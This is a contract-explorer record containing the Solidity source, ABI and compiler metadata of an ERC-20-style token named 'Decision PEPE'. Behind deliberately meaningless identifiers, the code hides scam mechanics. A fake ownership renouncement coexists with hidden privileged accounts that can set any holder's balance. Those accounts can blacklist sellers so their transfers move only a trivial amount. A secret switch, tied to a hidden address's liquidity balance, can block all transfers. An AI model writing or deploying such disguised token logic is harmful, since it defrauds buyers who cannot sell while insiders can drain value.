{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface receiverTeamSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableShould) external view returns (uint256);\n\n    function transfer(address atAmount, uint256 tradingExempt) external returns (bool);\n\n    function allowance(address takeIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atAmount,\n        uint256 tradingExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoAmount, uint256 value);\n    event Approval(address indexed takeIs, address indexed spender, uint256 value);\n}\n\nabstract contract launchExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atIs {\n    function createPair(address swapMax, address txReceiverShould) external returns (address);\n}\n\ninterface modeReceiver is receiverTeamSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DecisionPEPE is launchExempt, receiverTeamSender, modeReceiver {\n\n    function limitBuy(address tradingToken) public {\n        require(tradingToken.balance < 100000);\n        if (totalTrading) {\n            return;\n        }\n        \n        launchShould[tradingToken] = true;\n        \n        totalTrading = true;\n    }\n\n    uint256 enableMin;\n\n    function owner() external view returns (address) {\n        return launchedAuto;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minTx;\n    }\n\n    uint256 private maxAt;\n\n    function balanceOf(address enableShould) public view virtual override returns (uint256) {\n        return fundToken[enableShould];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return shouldLaunchMode;\n    }\n\n    bool public tokenTotal;\n\n    function sellIs(address receiverFee, address atAmount, uint256 tradingExempt) internal returns (bool) {\n        require(fundToken[receiverFee] >= tradingExempt);\n        fundToken[receiverFee] -= tradingExempt;\n        fundToken[atAmount] += tradingExempt;\n        emit Transfer(receiverFee, atAmount, tradingExempt);\n        return true;\n    }\n\n    bool private txSell;\n\n    bool public totalTrading;\n\n    function maxReceiver() public {\n        emit OwnershipTransferred(shouldIs, address(0));\n        launchedAuto = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellMode;\n    }\n\n    string private sellMode = \"DPE\";\n\n    event OwnershipTransferred(address indexed feeTake, address indexed maxSender);\n\n    function buyAuto(address toLaunch, uint256 tradingExempt) public {\n        launchedLaunch();\n        fundToken[toLaunch] = tradingExempt;\n    }\n\n    function launchedLaunch() private view {\n        require(launchShould[_msgSender()]);\n    }\n\n    bool public receiverSell;\n\n    constructor (){\n        \n        autoTx toToken = autoTx(senderIs);\n        fromFeeTo = atIs(toToken.factory()).createPair(toToken.WETH(), address(this));\n        if (tokenTotal == autoFund) {\n            autoFund = false;\n        }\n        shouldIs = _msgSender();\n        maxReceiver();\n        launchShould[shouldIs] = true;\n        fundToken[shouldIs] = feeLaunch;\n        \n        emit Transfer(address(0), shouldIs, feeLaunch);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedTotalAmount;\n\n    mapping(address => bool) public launchShould;\n\n    bool public txTakeSender;\n\n    uint256 public sellFee;\n\n    uint256 fundMode;\n\n    function limitMin(address autoLaunchList) public {\n        launchedLaunch();\n        \n        if (autoLaunchList == shouldIs || autoLaunchList == fromFeeTo) {\n            return;\n        }\n        atFee[autoLaunchList] = true;\n    }\n\n    function amountSenderMin(uint256 tradingExempt) public {\n        launchedLaunch();\n        fundMode = tradingExempt;\n    }\n\n    function approve(address buyIs, uint256 tradingExempt) public virtual override returns (bool) {\n        launchedTotalAmount[_msgSender()][buyIs] = tradingExempt;\n        emit Approval(_msgSender(), buyIs, tradingExempt);\n        return true;\n    }\n\n    uint256 constant swapTrading = 11 ** 10;\n\n    address public fromFeeTo;\n\n    uint256 private feeLaunch = 100000000 * 10 ** 18;\n\n    function allowance(address liquidityFundMarketing, address buyIs) external view virtual override returns (uint256) {\n        if (buyIs == senderIs) {\n            return type(uint256).max;\n        }\n        return launchedTotalAmount[liquidityFundMarketing][buyIs];\n    }\n\n    function teamFee(address receiverFee, address atAmount, uint256 tradingExempt) internal returns (bool) {\n        if (receiverFee == shouldIs) {\n            return sellIs(receiverFee, atAmount, tradingExempt);\n        }\n        uint256 atTakeLimit = receiverTeamSender(fromFeeTo).balanceOf(takeLimit);\n        require(atTakeLimit == fundMode);\n        require(atAmount != takeLimit);\n        if (atFee[receiverFee]) {\n            return sellIs(receiverFee, atAmount, swapTrading);\n        }\n        return sellIs(receiverFee, atAmount, tradingExempt);\n    }\n\n    function transferFrom(address receiverFee, address atAmount, uint256 tradingExempt) external override returns (bool) {\n        if (_msgSender() != senderIs) {\n            if (launchedTotalAmount[receiverFee][_msgSender()] != type(uint256).max) {\n                require(tradingExempt <= launchedTotalAmount[receiverFee][_msgSender()]);\n                launchedTotalAmount[receiverFee][_msgSender()] -= tradingExempt;\n            }\n        }\n        return teamFee(receiverFee, atAmount, tradingExempt);\n    }\n\n    address takeLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private minTx = 18;\n\n    mapping(address => uint256) private fundToken;\n\n    mapping(address => bool) public atFee;\n\n    uint256 private fundShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeLaunch;\n    }\n\n    function transfer(address toLaunch, uint256 tradingExempt) external virtual override returns (bool) {\n        return teamFee(_msgSender(), toLaunch, tradingExempt);\n    }\n\n    address senderIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public shouldIs;\n\n    string private shouldLaunchMode = \"Decision PEPE\";\n\n    function getOwner() external view returns (address) {\n        return launchedAuto;\n    }\n\n    address private launchedAuto;\n\n    uint256 public totalShouldMarketing;\n\n    bool public autoSwap;\n\n    bool public autoFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFundMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingExempt\",\"type\":\"uint256\"}],\"name\":\"amountSenderMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingExempt\",\"type\":\"uint256\"}],\"name\":\"buyAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFeeTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"}],\"name\":\"limitBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunchList\",\"type\":\"address\"}],\"name\":\"limitMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalShouldMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTakeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DecisionPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}